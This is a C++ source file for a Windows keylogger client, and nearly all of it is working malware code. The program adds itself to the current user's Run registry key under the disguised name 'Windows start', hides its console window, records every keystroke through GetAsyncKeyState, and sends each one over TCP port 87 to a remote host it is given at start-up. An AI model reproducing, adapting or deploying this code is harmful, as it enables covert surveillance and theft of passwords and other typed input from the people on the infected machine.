// keyloggerclient.cpp: 定義主控台應用程式的進入點。
//

#include "stdafx.h"


#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include<winuser.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include<iostream>
#include<conio.h>
#include<stdio.h>
#include<ctype.h>
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "87"

using namespace std;

void RegisterAutoRun(void) {
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue, L"Windows start", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	RegCloseKey(newValue);
}

bool SpecialKeys(int S_Key, SOCKET a) {
	switch (S_Key) {
	case VK_LWIN:
		return true;
	case VK_RWIN:
		return true;
	case VK_SPACE:
		send(a, " ", 1, 0);
		return true;
	case VK_RETURN:
		send(a, "[enter]", 7, 0);
		return true;
	case 16:
		return true;
	case 48:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, ")", 1, 0);
		}else {
			send(a, "0", 1, 0);
		}
		return true;
	case 49:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "!", 1, 0);
		}
		else {
			send(a, "1", 1, 0);
		}
		return true;
	case 50:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "@", 1, 0);
		}
		else {
			send(a, "2", 1, 0);
		}
		return true;
	case 51:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "#", 1, 0);
		}
		else {
			send(a, "3", 1, 0);
		}
		return true;
	case 52:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "$", 1, 0);
		}
		else {
			send(a, "4", 1, 0);
		}
		return true;
	case 53:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "%", 1, 0);
		}
		else {
			send(a, "5", 1, 0);
		}
		return true;
	case 54:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "^", 1, 0);
		}
		else {
			send(a, "6", 1, 0);
		}
		return true;
	case 55:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "&", 1, 0);
		}
		else {
			send(a, "7", 1, 0);
		}
		return true;
	case 56:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "*", 1, 0);
		}
		else {
			send(a, "8", 1, 0);
		}
		return true;
	case 57:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "(", 1, 0);
		}
		else {
			send(a, "9", 1, 0);
		}
		return true;
	case 189:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "_", 1, 0);
		}
		else {
			send(a, "-", 1, 0);
		}
		return true;
	case 187:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "+", 1, 0);
		}
		else {
			send(a, "=", 1, 0);
		}
		return true;
	case 188:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "<", 1, 0);
		}
		else {
			send(a, ",", 1, 0);
		}
		return true;
	case 190:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, ">", 1, 0);
		}
		else {
			send(a, ".", 1, 0);
		}
		return true;
	case 186:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, ":", 1, 0);
		}
		else {
			send(a, ";", 1, 0);
		}
		return true;
	case 191:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "?", 1, 0);
		}
		else {
			send(a, "/", 1, 0);
		}
		return true;
	case 219:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "{", 1, 0);
		}
		else {
			send(a, "[", 1, 0);
		}
		return true;
	case 220:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "|", 1, 0);
		}
		else {
			send(a, "\\", 1, 0);
		}
		return true;
	case 221:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "}", 1, 0);
		}
		else {
			send(a, "]", 1, 0);
		}
		return true;
	case 192:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "~", 1, 0);
		}
		else {
			send(a, "`", 1, 0);
		}
		return true;
	case 222:
		if (GetAsyncKeyState(VK_SHIFT)) {
			send(a, "\"", 1, 0);
		}
		else {
			send(a, "'", 1, 0);
		}
		return true;
	case VK_BACK:
		send(a, "[backspace]", 11, 0);
		return true;
	case VK_CAPITAL:
		return true;
	case VK_CONTROL:
		return true;
	case VK_MENU:
		return true;
	case VK_TAB:
		return true;
	case VK_UP:
		return true;
	case VK_DOWN:
		return true;
	case VK_RIGHT:
		return true;
	case VK_LEFT:
		return true;
	default:
		return false;
	}
}

int __cdecl main(int argc, char **argv)
{
	RegisterAutoRun();
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;
	char a;
	char b[15];
	char sendbuf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	bool iscap = 0;
	cin >> b;
	argv[1] = b;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 230; KEY++)
		{
			if (KEY == 160) {
				KEY = KEY + 2;
		}
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY, ConnectSocket) == false) {
					a = char(KEY);
					cout << KEY << " ";
					if (!GetKeyState(VK_CAPITAL)) {
						a=tolower(a);
					}
					if (GetAsyncKeyState(VK_SHIFT)) {
						if (isupper(a)) {
							a = tolower(a);
						}
						else {
							a = toupper(a);
						}
					}
					sendbuf[0] = a;
					send(ConnectSocket, sendbuf, 1, 0);

				}
			}
		}
	}
	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	// Receive until the peer closes the connection
	do {

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
			printf("Bytes received: %d\n", iResult);
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with error: %d\n", WSAGetLastError());

	} while (iResult > 0);

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

